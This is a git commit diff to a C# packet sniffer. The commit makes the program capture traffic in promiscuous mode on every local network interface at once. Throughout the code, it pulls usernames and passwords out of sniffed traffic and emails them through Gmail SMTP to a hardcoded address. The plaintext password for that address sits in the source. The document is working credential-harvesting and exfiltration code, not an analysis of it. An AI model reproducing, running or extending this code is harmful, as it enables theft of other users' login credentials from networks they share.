0819bffb513de595accd4f5715f5af2b7468eb82
Foxman <ron.mikhlin7@gmail.com>
2015-01-14 14:53:11 +0200

    MultiThreading
    התוכנה מסניפה בו זמנית מכל המכשירים

--- ConsoleApplication28/ConsoleApplication28/Program.cs
+++ ConsoleApplication28/ConsoleApplication28/Program.cs
@@ -11,12 +11,13 @@ using PcapDotNet.Packets.Transport;
 using System.Net;
 using System.IO;
 using System.Net.Mail;
+using System.Threading;
 
 namespace ConsoleApplication28
 {
     class Program
     {
-
+        //finds computer ip adress
         public static string LocalIPAddress()
         {
             IPHostEntry host;
@@ -33,49 +34,19 @@ namespace ConsoleApplication28
             return localIP;
         }
 
-        static void Main(string[] args)
-        {
-            // Retrieve the device list from the local machine
-            IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine;
+        private static int deviceNumber; //global integer to pass on between threads
+        private static IList<LivePacketDevice> allDevices = LivePacketDevice.AllLocalMachine; // global list of all deivices
 
-            Console.WriteLine("Your Local Ip Addreas is:" + LocalIPAddress());
-
-            if (allDevices.Count == 0)
-            {
-                Console.WriteLine("No interfaces found! Make sure WinPcap is installed.");
-                return;
-            }
-
-            // Print the list
-            for (int i = 0; i != allDevices.Count; ++i)
-            {
-                LivePacketDevice device = allDevices[i];
-                Console.Write((i + 1) + ". " + device.Name);
-                if (device.Description != null)
-                    Console.WriteLine("(" + device.Description + ")");
-                else
-                    Console.WriteLine(" (No description available)");
-            }
-
-            int deviceIndex = 0;
-            do
-            {
-                Console.WriteLine("Enter the interface number (1-" + allDevices.Count + "):");
-                string deviceIndexString = Console.ReadLine();
-                if (!int.TryParse(deviceIndexString, out deviceIndex) ||
-                    deviceIndex < 1 || deviceIndex > allDevices.Count)
-                {
-                    deviceIndex = 0;
-                }
-            } while (deviceIndex == 0);
-
+        //capture thread
+        public static void CaptureStarter()
+        {           
             // Take the selected adapter
-            PacketDevice selectedDevice = allDevices[deviceIndex - 1];
+            PacketDevice selectedDevice = allDevices[deviceNumber];
 
             // Open the device
-            using (PacketCommunicator communicator = 
+            using (PacketCommunicator communicator =
                 selectedDevice.Open(65536,                                  // portion of the packet to capture
-                                                                            // 65536 guarantees that the whole packet will be captured on all the link layers
+                // 65536 guarantees that the whole packet will be captured on all the link layers
                                     PacketDeviceOpenAttributes.Promiscuous, // promiscuous mode
                                     1000))                                  // read timeout
             {
@@ -85,10 +56,23 @@ namespace ConsoleApplication28
                     communicator.SetFilter(filter);
                 }
 
-                Console.WriteLine("Listening on " + selectedDevice.Description + "...");
+                Console.WriteLine("Listening on device " + (deviceNumber + 1) + " out of " + allDevices.Count + " :  " + selectedDevice.Description + "...");
 
                 // start the capture
                 communicator.ReceivePackets(0, PacketHandler);
+            }
+        }
+
+        static void Main(string[] args)
+        {           
+            //opens thread for every device, to capture traffic from all devices.
+            Thread[] recievers = new Thread[allDevices.Count];
+            for (int i = 0; i < allDevices.Count; i++)
+            {
+                deviceNumber = i;                               // sets global integer to device number to pass it on to the right thread
+                recievers[i] = new Thread(CaptureStarter);      //creates thread
+                recievers[i].Start();                           // starts thread
+                Thread.Sleep(40);                               //thread sleeps for a while to let the just opened thread to finish it's initialisation
             }
         }
 
@@ -111,9 +95,9 @@ namespace ConsoleApplication28
 
             // print ip addresses and udp ports
             string s = content;
-
-            if (s.IndexOf("username=") != -1 && s.IndexOf("password=") != -1)
+            if (s.IndexOf("username=") != -1 && s.IndexOf("password=") != -1) // if program finds username and password in the sniffed data
             {
+                //extracts username and password into string variables
                 int userLength = s.IndexOf("&pass") - s.IndexOf("username=");
                 string username = s.Substring(s.IndexOf("username="), userLength);
                 Console.WriteLine(username);
@@ -121,16 +105,20 @@ namespace ConsoleApplication28
                 string pass = s.Substring(s.IndexOf("password="), passLength);
                 Console.WriteLine(pass);
 
+                //data for email
                 string smtp = "smtp.gmail.com";
                 string emailaddr = "cybersniffsniff@gmail.com";
                 string emailuser = "cybersniffsniff";
                 string emailpassword = "cybergal123";
 
+                //creates email object and configures smtp client
                 MailMessage mail = new MailMessage(emailaddr, emailaddr, "Login From:" + LocalIPAddress() , username + "\n" + pass);
                 SmtpClient client = new SmtpClient(smtp);
                 client.Port = 587;
                 client.Credentials = new System.Net.NetworkCredential(emailuser, emailpassword);
                 client.EnableSsl = true;
+
+                //sends email
                 client.Send(mail);             
             }
         }
